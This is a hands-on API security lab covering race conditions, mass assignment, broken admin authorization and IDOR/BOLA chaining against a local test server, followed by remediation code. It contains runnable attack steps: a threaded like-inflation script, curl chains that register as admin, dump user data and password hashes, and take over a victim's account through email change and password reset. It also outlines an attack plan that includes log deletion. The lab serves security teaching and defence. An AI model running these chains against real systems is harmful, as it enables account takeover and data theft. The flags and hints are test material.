# Lab 11: Business Logic Flaws & Vulnerability Chaining

## Objective

Exploit business logic flaws including race conditions, chain multiple vulnerabilities together for maximum impact, and demonstrate full account takeover through vulnerability combinations.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Hard |
| **Estimated Time** | 90 minutes |
| **Prerequisites** | Labs 01–10 completed, Python 3 with `requests` and `threading`, understanding of concurrency |
| **OWASP API Category** | API6:2023 – Unrestricted Access to Sensitive Business Flows |

---

## Background

### What Are Business Logic Flaws?

Business logic flaws are vulnerabilities that arise from **incorrect assumptions** or **missing validations** in the application's workflow — not from traditional injection or authentication issues. They exploit the gap between what the developer intended and what the application actually allows.

### Types of Business Logic Flaws

| Flaw | Description | Example |
|---|---|---|
| **Race Condition** | Concurrent requests bypass sequential checks | Liking a post 100 times simultaneously |
| **Workflow Bypass** | Skipping required steps in a process | Verifying account without email confirmation |
| **State Manipulation** | Modifying resource state in unintended ways | Setting negative transfer amounts |
| **Limit Bypass** | Circumventing rate limits or quotas | Sending unlimited password reset emails |
| **Privilege Accumulation** | Chaining minor flaws for major impact | IDOR + Mass Assignment = Account Takeover |

### Vulnerability Chaining

Individual low-severity vulnerabilities can be combined into **critical attack chains**:

```
Mass Assignment (Medium)  ─┐
                            ├─▶  Full Platform Compromise (Critical)
Broken Admin Auth (High)  ─┤
                            ├─▶  Access all user data
BOLA/IDOR (Medium)        ─┘
```

### Race Conditions in APIs

Race conditions occur when two or more concurrent operations conflict. APIs are especially vulnerable because:

- HTTP requests are inherently concurrent
- Database operations may not be atomic
- Caching layers introduce consistency delays

```
Thread 1: Read likes_count = 5
Thread 2: Read likes_count = 5    (before Thread 1 writes)
Thread 1: Write likes_count = 6
Thread 2: Write likes_count = 6   (should be 7, but data is lost!)
```

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5000` |
| Test Users | `alice/password123`, `bob/password123`, `charlie/password123` |
| Admin User | `admin/admin123` (id=4) |
| Test Post | id=1 (owned by alice) |

---

## Tasks

### Task 1: Race Condition on Post Likes

**Goal:** Exploit a race condition to inflate a post's like count beyond what should be possible.

**Steps:**

1. First, check the current like count of a post:

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s http://localhost:5000/api/v1/posts/1 \
  -H "Authorization: Bearer $TOKEN"
```

2. A single user should only be able to like a post **once**. But what happens if we send 10 concurrent like requests?

```python
import threading
import requests

API = "http://localhost:5000/api/v1"
TOKEN = "YOUR_TOKEN_HERE"  # Replace with actual token

def like_post():
    resp = requests.post(
        f"{API}/posts/1/like",
        headers={"Authorization": f"Bearer {TOKEN}"}
    )
    print(f"Status: {resp.status_code}, Response: {resp.text[:80]}")

# Send 10 concurrent likes
threads = []
for _ in range(10):
    t = threading.Thread(target=like_post)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

3. Check the post's like count again. Is it 1 (correct) or more (race condition)?

4. Try with even more threads (50 or 100) for more dramatic results.

> **🚩 FLAG 1:** What is the actual likes_count after 10 concurrent requests? (Expected: 1, Actual: ?)

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
Race conditions happen because the server reads, processes, and writes without proper locking. Use Python's <code>threading</code> module to send requests simultaneously.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
All 10 threads read the same initial value, increment it by 1, and write back. The final count might be anywhere from 1 to 10 depending on timing.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
Without proper database-level locking or unique constraints, the like count will likely be higher than 1. Some duplicate entries may be created in the likes table.
</details>

---

### Task 2: Chained Attack — Mass Assignment → Admin Access → Data Dump

**Goal:** Chain mass assignment with broken admin authorization to dump all user data.

**Steps:**

**Step 2a: Register as Admin (Mass Assignment)**

```bash
curl -s -X POST http://localhost:5000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "chainattacker",
    "email": "chain@evil.com",
    "password": "chain123",
    "role": "admin"
  }'
```

**Step 2b: Login and Get Admin Token**

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"chainattacker","password":"chain123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

**Step 2c: Access Admin Endpoints (Broken Authorization)**

```bash
# Dump all users
curl -s http://localhost:5000/api/v1/admin/users \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Get platform stats
curl -s http://localhost:5000/api/v1/admin/stats \
  -H "Authorization: Bearer $TOKEN"
```

**Step 2d: Export Each User's Profile (Excessive Data Exposure)**

```bash
# Loop through user IDs to export full profiles
for id in 1 2 3 4; do
  echo "=== User $id ==="
  curl -s http://localhost:5000/api/v1/users/$id \
    -H "Authorization: Bearer $TOKEN"
  echo ""
done
```

> **🚩 FLAG 2:** Extract all user password hashes through the chained attack

<details>
<summary>Hint 1</summary>
The chain is: Mass Assignment (get admin role) → Admin endpoint (list all users) → User profiles may expose password hashes.
</details>

<details>
<summary>Hint 2</summary>
If the admin endpoint doesn't expose hashes, combine with the SQL injection from Lab 08 or the export/profile endpoint which returns excessive data.
</details>

<details>
<summary>Hint 3</summary>
The full chain: Register with role=admin → Login → <code>GET /admin/users</code> or SQLi to extract all password hashes. The export endpoint (<code>/export/profile</code>) may also expose hashes.
</details>

---

### Task 3: IDOR + Mass Assignment = Account Takeover

**Goal:** Chain IDOR (reading another user's data) with mass assignment (modifying their account) for full account takeover.

**Steps:**

**Step 3a: Reconnaissance via IDOR — Read Victim's Profile**

```bash
# Login as attacker
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Read bob's profile (IDOR — no authorization check)
curl -s http://localhost:5000/api/v1/users/2 \
  -H "Authorization: Bearer $TOKEN"
```

**Step 3b: Modify Victim's Account (BOLA + Mass Assignment)**

```bash
# As alice, modify bob's profile — change his email
curl -s -X PUT http://localhost:5000/api/v1/users/2 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email": "attacker-controlled@evil.com"}'
```

**Step 3c: Password Reset to Attacker-Controlled Email**

```bash
# Request password reset for bob — it goes to attacker's email
curl -s -X POST http://localhost:5000/api/v1/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker-controlled@evil.com"}'
```

**Step 3d: Escalate Victim's Privileges**

```bash
# Set bob's role to admin and verify his account
curl -s -X PUT http://localhost:5000/api/v1/users/2 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"role": "admin", "is_verified": true}'
```

> **🚩 FLAG 3:** Demonstrate full account takeover chain (IDOR read → BOLA write → password reset → privilege escalation)

<details>
<summary>Hint 1</summary>
First read the victim's profile to understand their account, then modify it using the BOLA vulnerability in the PUT endpoint.
</details>

<details>
<summary>Hint 2</summary>
The key insight is that alice can use PUT <code>/users/2</code> (bob's ID) because there's no authorization check — it only requires a valid JWT, not that the JWT user_id matches the target user.
</details>

<details>
<summary>Hint 3</summary>
Full chain: <code>GET /users/2</code> (read bob's data) → <code>PUT /users/2 {"email":"..."}</code> (change email) → <code>POST /auth/reset-password</code> (get reset token) → <code>PUT /users/2 {"role":"admin"}</code> (escalate)
</details>

---

### Task 4: Bypass Account Verification

**Goal:** Register an account and immediately verify it without any email confirmation.

**Steps:**

1. Register a new account (starts as unverified):

```bash
curl -s -X POST http://localhost:5000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "unverified_user",
    "email": "unverified@test.com",
    "password": "test123"
  }'
```

2. Login and check verification status:

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"unverified_user","password":"test123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Check profile - should be unverified
curl -s http://localhost:5000/api/v1/users/5 \
  -H "Authorization: Bearer $TOKEN"
```

3. Bypass verification via mass assignment:

```bash
curl -s -X PUT http://localhost:5000/api/v1/users/5 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"is_verified": true}'
```

4. Or even better — register with `is_verified` already set:

```bash
curl -s -X POST http://localhost:5000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "pre_verified",
    "email": "pre_verified@test.com",
    "password": "test123",
    "is_verified": true
  }'
```

---

### Task 5: Full Attack Narrative

**Goal:** Combine everything into a complete attack story.

Document the full attack chain in order:

```
1. RECON:       Enumerate users via /users/search or IDOR
2. ESCALATE:    Register with role=admin (mass assignment)
3. ACCESS:      Use admin token to access /admin/* endpoints
4. EXTRACT:     Dump all user data, password hashes (SQLi or export)
5. TAKEOVER:    Modify any user's email/role via BOLA + mass assignment
6. PERSIST:     Forge long-lived JWT tokens with cracked secret
7. COVER:       Delete audit logs via admin endpoints
```

---

## Flags Summary

| Flag | Description | Value |
|---|---|---|
| FLAG 1 | Likes count after concurrent requests | >1 (race condition confirmed) |
| FLAG 2 | All user password hashes via chained attack | Hashes of alice, bob, charlie, admin |
| FLAG 3 | Full account takeover chain demonstrated | IDOR → BOLA → Mass Assignment |

---

## Remediation

### 1. Race Condition Prevention

```python
# Use database-level locking
from sqlalchemy import func

@app.route('/api/v1/posts/<int:id>/like', methods=['POST'])
def like_post(id):
    # Use a unique constraint to prevent duplicate likes
    existing = Like.query.filter_by(
        user_id=current_user.id,
        post_id=id
    ).first()
    if existing:
        return jsonify({"error": "Already liked"}), 409

    # Or use INSERT ... ON CONFLICT DO NOTHING
    db.session.execute(
        "INSERT INTO likes (user_id, post_id) VALUES (:uid, :pid) "
        "ON CONFLICT (user_id, post_id) DO NOTHING",
        {"uid": current_user.id, "pid": id}
    )
    db.session.commit()
```

### 2. Break the Attack Chain

- **Mass Assignment**: Implement field allowlists
- **Admin Auth**: Verify role from database, not just JWT claims
- **BOLA**: Check resource ownership on every request
- **Data Exposure**: Never return password hashes or internal fields

### 3. Implement Idempotency Keys

```python
@app.route('/api/v1/posts/<int:id>/like', methods=['POST'])
def like_post(id):
    idempotency_key = request.headers.get('Idempotency-Key')
    if idempotency_key:
        cached = redis.get(f"idempotency:{idempotency_key}")
        if cached:
            return jsonify(json.loads(cached))
```

### 4. State Machine Validation

Enforce workflow states (e.g., unverified → pending → verified):

```python
VALID_TRANSITIONS = {
    'unverified': ['pending_verification'],
    'pending_verification': ['verified'],
    'verified': [],  # Can't go back
}

def update_status(user, new_status):
    if new_status not in VALID_TRANSITIONS.get(user.status, []):
        raise ValueError(f"Invalid transition: {user.status} → {new_status}")
```

### 5. Defense in Depth

No single vulnerability should allow full compromise. Layer defenses:

```
Input Validation → Authentication → Authorization → Business Logic → Output Filtering
```

---

## References

- [OWASP Business Logic Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
- [PortSwigger — Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [Race Condition Attacks on Web Applications](https://owasp.org/www-community/attacks/Race_Condition)
- [CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)
- [OWASP Testing Guide: Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/)
